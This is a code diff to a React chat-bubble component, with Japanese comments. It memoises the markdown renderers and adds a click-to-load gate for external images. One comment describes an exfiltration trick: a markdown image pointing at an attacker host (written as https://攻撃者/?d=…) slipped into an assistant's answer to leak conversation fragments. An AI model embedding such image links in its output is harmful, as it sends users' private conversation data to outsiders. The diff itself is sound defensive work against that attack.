@@ -3,6 +3,7 @@
 
 import { Children, useCallback, useEffect, useMemo, useRef, useState, type ReactNode } from "react";
 import { Bot, BookPlus, BookMarked, Send, Square, Trash2, FileDown, FilePlus, List, Replace, AlertCircle, X, AtSign, Info, Lightbulb, Sparkles, Loader2, Check, Pencil, RotateCcw, GitFork, FileText, ClipboardList, Link as LinkIcon } from "lucide-react";
+import { GatedMarkdownImage } from "./gated-markdown-image";
 import ReactMarkdown, { type Components } from "react-markdown";
 import remarkGfm from "remark-gfm";
 import { rehypeSupSub } from "./rehype-sup-sub";
@@ -811,6 +812,9 @@ export function ChatBubble({
   onOpenWiki?: (wikiId: string) => void;
 }) {
   const t = useT();
+  // components は描画のたびに作り直すと React が子を作り直し、押して読み込んだ画像が枠に戻る。
+  // sourceLinks が変わるときだけ作り直す
+  const markdownComponents = useMemo(() => buildMarkdownComponents(sourceLinks), [sourceLinks]);
   const isUser = message.role === "user";
   const hasMakeKnowledge = !!onGenerateKnowledgeCandidates;
   // user メッセージの編集状態（編集&再実行）
@@ -1000,7 +1004,7 @@ export function ChatBubble({
             <ReactMarkdown
               remarkPlugins={[remarkGfm]}
               rehypePlugins={[rehypeSupSub]}
-              components={buildMarkdownComponents(sourceLinks)}
+              components={markdownComponents}
             >
               {displayContent}
             </ReactMarkdown>
@@ -1443,7 +1447,7 @@ function processChildren(
  * - 既存の bubble に収まるよう見出し・段落の余白を抑える
  * - テキストノード内の [Source: "..."] を Wiki リンクに変換
  */
-function buildMarkdownComponents(handlers: SourceLinkHandlers | undefined): Components {
+export function buildMarkdownComponents(handlers: SourceLinkHandlers | undefined): Components {
   const proc = (children: ReactNode) => processChildren(children, handlers);
   return {
     h1: ({ children }) => <h1 className="text-base font-semibold mt-2 mb-1">{proc(children)}</h1>,
@@ -1465,6 +1469,9 @@ function buildMarkdownComponents(handlers: SourceLinkHandlers | undefined): Comp
     blockquote: ({ children }) => (
       <blockquote className="border-l-2 border-border pl-2 my-1.5 text-muted-foreground">{proc(children)}</blockquote>
     ),
+    // 外部画像は自動で読み込まない（押したときだけ）。回答に混ぜた ![](https://攻撃者/?d=…) で
+    // 会話の断片が外へ出るのを防ぐ
+    img: ({ src, alt }) => <GatedMarkdownImage src={typeof src === "string" ? src : undefined} alt={alt} />,
     code: ({ children, className }) => {
       // インラインコードのみここで装飾。pre 内の code は pre 側で扱う。
       if (className) return <code className={className}>{children}</code>;
